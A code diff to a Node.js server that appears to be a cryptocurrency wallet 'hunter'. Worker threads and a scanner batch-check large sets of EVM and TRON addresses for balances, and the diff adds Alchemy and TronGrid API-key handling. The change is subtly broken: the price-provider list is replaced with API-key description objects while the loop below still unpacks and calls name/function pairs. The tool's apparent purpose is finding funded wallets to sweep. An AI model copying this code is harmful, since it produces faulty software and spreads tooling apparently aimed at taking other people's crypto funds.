@@ -2299,9 +2299,14 @@ async function ensureLivePrices(force = false) {
   priceRefreshInFlight = (async () => {
     livePriceBook.lastAttemptAt = Date.now();
     const providers = [
-      ['coingecko', fetchCoinGeckoPrices],
-      ['binance', fetchBinancePrices]
-    ];
+    { id: 'alchemyApiKey', name: 'Alchemy (ETH JSON-RPC)', chain: 'ETH/EVM', key: apiKeysConfig.alchemyApiKey, masked: mask(apiKeysConfig.alchemyApiKey), active: !!alchemyRpcUrl(apiKeysConfig.alchemyApiKey), mode: 'Used for Ethereum RPC — paste the API key or the full https URL. Highest impact for EVM scanning.' },
+    { id: 'tronGridApiKey', name: 'TronGrid (TRON / USDT-TRC20)', chain: 'TRX/USDT', key: apiKeysConfig.tronGridApiKey, masked: mask(apiKeysConfig.tronGridApiKey), active: !!apiKeysConfig.tronGridApiKey, mode: 'Used as the TRON-PRO-API-KEY header — raises the TRON rate limit.' },
+    { id: 'etherscanApiKey', name: 'Etherscan V2', chain: 'ETH/USDT', key: apiKeysConfig.etherscanApiKey, masked: mask(apiKeysConfig.etherscanApiKey), active: !!apiKeysConfig.etherscanApiKey, mode: 'Stored only — not used yet. Ethereum verification runs through the keyless RPC above.' },
+    { id: 'blockCypherApiKey', name: 'BlockCypher', chain: 'BTC', key: apiKeysConfig.blockCypherApiKey, masked: mask(apiKeysConfig.blockCypherApiKey), active: !!apiKeysConfig.blockCypherApiKey, mode: 'Stored only — not used yet. BTC uses the keyless blockchain.info multiaddr API.' },
+    { id: 'quickNodeApiKey', name: 'QuickNode (Solana)', chain: 'SOL', key: apiKeysConfig.quickNodeApiKey, masked: mask(apiKeysConfig.quickNodeApiKey), active: !!apiKeysConfig.quickNodeApiKey, mode: 'Stored only — not used yet. Solana uses the keyless public RPC.' },
+    { id: 'polygonscanApiKey', name: 'Polygonscan', chain: 'MATIC', key: apiKeysConfig.polygonscanApiKey, masked: mask(apiKeysConfig.polygonscanApiKey), active: !!apiKeysConfig.polygonscanApiKey, mode: 'Stored only — not used yet. Polygon uses the keyless public RPC.' },
+    { id: 'bscscanApiKey', name: 'BscScan', chain: 'BNB', key: apiKeysConfig.bscscanApiKey, masked: mask(apiKeysConfig.bscscanApiKey), active: !!apiKeysConfig.bscscanApiKey, mode: 'Stored only — not used yet. BNB Chain uses the keyless public RPC.' }
+  ];
     for (const [name, fn] of providers) {
       try {
         const usd = await fn();
@@ -2360,7 +2365,7 @@ function priceBookSummary() {
 let serverRpcState = 'unknown'; // 'unknown' | 'online' | 'firewalled'
 let serverRpcLastProbeAt = 0;
 
-function httpsJsonRequest(reqUrl, method = 'GET', bodyObj = null, timeoutMs = 1800) {
+function httpsJsonRequest(reqUrl, method = 'GET', bodyObj = null, timeoutMs = 1800, extraHeaders = null) {
   return new Promise((resolve, reject) => {
     const parsed = new URL(reqUrl);
     const payload = bodyObj ? JSON.stringify(bodyObj) : null;
@@ -2375,6 +2380,7 @@ function httpsJsonRequest(reqUrl, method = 'GET', bodyObj = null, timeoutMs = 18
       headers: {
         'Accept': 'application/json',
         'User-Agent': 'WalletRecoveryScanner/2.0',
+        ...(extraHeaders && typeof extraHeaders === 'object' ? extraHeaders : {}),
         ...(payload ? {
           'Content-Type': 'application/json',
           'Content-Length': Buffer.byteLength(payload)
@@ -2522,9 +2528,8 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
         if (!chainSet.has(chainFlag) && !(chainFlag === 'ETH' && chainSet.has('USDT'))) continue;
         const sweep = eng.buildMulticall3WalletSweep(allEvmAddrs, cfg);
         if (!sweep.data) continue;
-        const rpcUrl = (chainFlag === 'ETH' && apiKeysConfig.alchemyApiKey && apiKeysConfig.alchemyApiKey.startsWith('http'))
-          ? apiKeysConfig.alchemyApiKey
-          : cfg.rpcs[0];
+        const alchemyUrl = alchemyRpcUrl(apiKeysConfig.alchemyApiKey);
+        const rpcUrl = (chainFlag === 'ETH' && alchemyUrl) ? alchemyUrl : cfg.rpcs[0];
         tasks.push(
           httpsJsonRequest(rpcUrl, 'POST', {
             jsonrpc: '2.0',
@@ -2581,7 +2586,7 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
           });
         });
         tasks.push(
-          httpsJsonRequest('https://api.trongrid.io/jsonrpc', 'POST', trxBatch, 1800).then(respArr => {
+          httpsJsonRequest('https://api.trongrid.io/jsonrpc', 'POST', trxBatch, 1800, tronGridHeaders()).then(respArr => {
             liveRpcRequestsSent++;
             liveRpcAddressesChecked += trxItems.length;
             if (!Array.isArray(respArr)) return;
@@ -2831,6 +2836,21 @@ for (let wId = 0; wId < WORKER_THREAD_COUNT; wId++) {
   } catch (err) {
     console.error(`[HunterWorker Spawn Error]`, err.message);
   }
+}
+
+/** Alchemy accepts either a full RPC URL or the bare API key from the dashboard. */
+function alchemyRpcUrl(raw) {
+  const v = String(raw || '').trim();
+  if (!v) return null;
+  if (/^https?:\/\//i.test(v)) return v;
+  if (/^[A-Za-z0-9_-]{16,}$/.test(v)) return `https://eth-mainnet.g.alchemy.com/v2/${v}`;
+  return null;
+}
+
+/** TronGrid raises its rate limit when the key travels in this header. */
+function tronGridHeaders() {
+  const key = String(apiKeysConfig.tronGridApiKey || '').trim();
+  return key ? { 'TRON-PRO-API-KEY': key } : null;
 }
 
 function getApiKeysStatusSummary() {
@@ -4264,7 +4284,7 @@ const server = http.createServer((req, res) => {
     return res.end(JSON.stringify({
       ok: true,
       app: 'CodeHaven Workstation',
-      version: '2.6.3',
+      version: '2.6.4',
       scanning: Boolean(serverDaemonActive),
       scanned: serverDaemonScanned,
       ratePerSec: hardwareScanRatePerSec,
